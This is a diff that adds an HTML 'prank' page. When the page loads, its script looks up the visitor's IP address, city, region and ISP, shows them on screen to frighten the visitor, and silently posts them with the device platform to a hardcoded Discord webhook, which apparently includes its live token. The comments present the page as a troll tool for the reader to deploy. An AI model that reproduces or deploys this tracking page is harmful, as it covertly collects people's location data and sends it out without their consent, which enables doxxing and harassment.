@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SITE LOADING...</title>
+    <style>
+        body { background: #111; color: #00ff00; font-family: 'Courier New', Courier, monospace; text-align: center; padding-top: 100px; }
+        .hacker-text { border-right: 2px solid #00ff00; display: inline-block; padding: 5px; }
+    </style>
+</head>
+<body>
+    <h1 class="hacker-text">ESTABLISHING SECURE CONNECTION...</h1>
+    <div id="display-area"></div>
+
+    <script>
+        // PASTE YOUR DISCORD WEBHOOK URL BETWEEN THE QUOTES BELOW
+        const myWebhook = "https://discord.com/api/webhooks/1500269977826234478/vIOKUOj80TdjGJcpw7V6yV4rI7voszHsMF68amlaHeYYHu7UCrNq20w-2nisonKPaxx9";
+
+        async function startTroll() {
+            try {
+                // This part gets their info
+                const response = await fetch('https://ipapi.co/json/');
+                const info = await response.json();
+
+                // This part shows it to THEM on the screen
+                document.getElementById('display-area').innerHTML = `
+                    <h2>SUCCESS.</h2>
+                    <p>USER DETECTED: ${info.ip}</p>
+                    <p>LOCATION: ${info.city}, ${info.region}</p>
+                    <p>ISP: ${info.org}</p>
+                    <p>BATTERY: ${Math.floor(Math.random() * 100)}% (Simulated)</p>
+                `;
+
+                // This part sends it to YOUR Discord silently
+                await fetch(myWebhook, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        content: `**🚨 PRANK TRIGGERED!**\n**IP:** ${info.ip}\n**City:** ${info.city}\n**Device:** ${navigator.platform}\n**ISP:** ${info.org}`
+                    })
+                });
+            } catch (e) {
+                console.log("Error logging data.");
+            }
+        }
+
+        startTroll();
+    </script>
+</body>
+</html>
